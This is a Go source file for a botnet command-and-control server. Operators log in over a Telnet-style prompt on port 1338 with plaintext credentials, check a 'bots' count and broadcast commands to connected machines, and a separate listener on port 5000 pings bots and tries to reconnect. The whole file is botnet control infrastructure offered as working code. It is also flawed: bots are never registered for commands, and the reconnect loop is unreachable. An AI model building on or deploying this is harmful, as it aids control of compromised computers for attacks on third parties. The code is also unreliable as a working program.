package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const (
	credentialsFile = "users.txt"    // File containing user credentials (username:password)
	botPort         = ":5000"        // Bot will listen on port 5000
	reconnectDelay  = 10 * time.Second // Delay before attempting to reconnect with bots
)

var credentials map[string]string   // Map to store user credentials (username:password)
var loggedInUsers map[string]net.Conn // Map to store logged-in users and their connections

// Function to authenticate a user based on their username and password
func authenticateUser(username, password string) bool {
	if storedPassword, found := credentials[username]; found {
		return storedPassword == password
	}
	return false
}

// Function to read credentials from a file and return a map of username:password pairs
func readCredentialsFromFile(filename string) map[string]string {
	credentials := make(map[string]string)

	file, err := os.Open(filename)
	if err != nil {
		panic("\nError opening credentials file:\n\r " + err.Error())
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) == 2 {
			username := strings.TrimSpace(parts[0])
			password := strings.TrimSpace(parts[1])
			credentials[username] = password
		}
	}

	if err := scanner.Err(); err != nil {
		panic("\nError reading credentials file:\n\r " + err.Error())
	}

	return credentials
}

// Function to handle incoming connections from administrators (CNC server)
func handleConnection(conn net.Conn) {
	defer conn.Close()

	fmt.Println("New connection from:", conn.RemoteAddr())

	clearScreen(conn)

	conn.Write([]byte("\n__________\r"))
	conn.Write([]byte("\n|Username\r"))
	conn.Write([]byte("\n|\r"))
	conn.Write([]byte("\n|> "))
	username, err := readInput(conn)
	if err != nil {
		fmt.Println("Error reading username:", err.Error())
		return
	}

	clearScreen(conn)

	conn.Write([]byte("\n__________\r"))
	conn.Write([]byte("\n|Password\r"))
	conn.Write([]byte("\n|\r"))
	conn.Write([]byte("\n|> "))
	password, err := readInput(conn)
	if err != nil {
		fmt.Println("\nError reading password:", err.Error())
		return
	}

	clearScreen(conn)

	// Trim the newline characters from the username and password
	username = strings.TrimSpace(username)
	password = strings.TrimSpace(password)

	// Authenticate the user based on provided credentials
	if !authenticateUser(username, password) {
		conn.Write([]byte("\n\rLogin failed. Invalid credentials.\n"))
		return
	}

	loggedInUsers[username] = conn

	conn.Write([]byte("\n\rLogin successful!\n"))
	time.Sleep(1 * time.Second)
	clearScreen(conn)

	// Command loop, allow the user to interact and send commands to bots
	for {
		conn.Write([]byte(fmt.Sprintf("\r%s:/tmp/v2/cnc$> ", username)))
		command, err := readInput(conn)
		if err != nil {
			fmt.Println("\nError reading command:", err.Error())
			return
		}

		command = strings.TrimSpace(command)
		if command == "logout" {
			break
		} else if command == "clear" {
			clearScreen(conn)
		} else if command == "bots" {
			count := len(loggedInUsers) - 1 // excluding the server connection
			conn.Write([]byte(fmt.Sprintf("\rBots: %d\n", count)))
		} else {
			// Broadcast the command to all bots
			for _, botConn := range loggedInUsers {
				if botConn != conn { // Avoid sending the command to the server itself
					botConn.Write([]byte(fmt.Sprintf("\rCommand from %s: %s\n", username, command)))
				}
			}
		}
	}

	// Remove user from loggedInUsers on logout
	delete(loggedInUsers, username)
}

// Function to clear the screen of the connected client terminal
func clearScreen(conn net.Conn) {
	// Sending escape sequences to clear the screen and the scrollback buffer
	conn.Write([]byte("\033[2J\033[3J\033[H"))
}

// Function to read input from a connected client
func readInput(conn net.Conn) (string, error) {
	reader := bufio.NewReader(conn)
	input, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return input, nil
}

// Function to start the bot server and listen for incoming bot connections
func botServer(cncServerIP, cncServerPort string) {
	botListener, err := net.Listen("tcp", botPort)
	if err != nil {
		fmt.Println("Error starting the bot server:", err.Error())
		return
	}
	defer botListener.Close()

	fmt.Println("Bot server started. Listening on port 5000..")

	for {
		conn, err := botListener.Accept()
		if err != nil {
			fmt.Println("Error accepting bot connection:", err.Error())
			continue
		}

		go handleBotConnection(conn, cncServerIP, cncServerPort)
	}
}

// Function to handle individual bot connections
func handleBotConnection(conn net.Conn, cncServerIP, cncServerPort string) {
	defer conn.Close()
	fmt.Println("Bot connected:", conn.RemoteAddr())

	for {
		// Handle bot commands here if needed
		time.Sleep(1 * time.Second)
		conn.Write([]byte("PING\n"))
	}

	// When connection is closed by CNC server, attempt to reconnect
	for {
		fmt.Println("Connection closed by the CNC server. Reconnecting...")
		time.Sleep(reconnectDelay)

		conn, err := net.Dial("tcp", cncServerIP+":"+cncServerPort)
		if err != nil {
			fmt.Println("Error connecting to CNC server:", err.Error())
			continue
		}

		fmt.Println("Bot connected:", conn.RemoteAddr())
		go handleBotConnection(conn, cncServerIP, cncServerPort)
	}
}

func main() {
	// Read the credentials from the file into a map
	credentials = readCredentialsFromFile(credentialsFile)

	// Initialize the loggedInUsers map
	loggedInUsers = make(map[string]net.Conn)

	// Start the TCP server
	server, err := net.Listen("tcp", ":1338")
	if err != nil {
		panic("Error starting the server: " + err.Error())
	}
	defer server.Close()

	fmt.Println("Login server started. Listening on port 1338 (Telnet)..")

	// Define your CNC server IP and Port here
	cncServerIP := "127.0.0.1"
	cncServerPort := "5000"

	// Start the bot server in a separate goroutine
	go botServer(cncServerIP, cncServerPort)

	// Accept incoming connections from administrators
	for {
		conn, err := server.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err.Error())
			continue
		}

		go handleConnection(conn)
	}
}
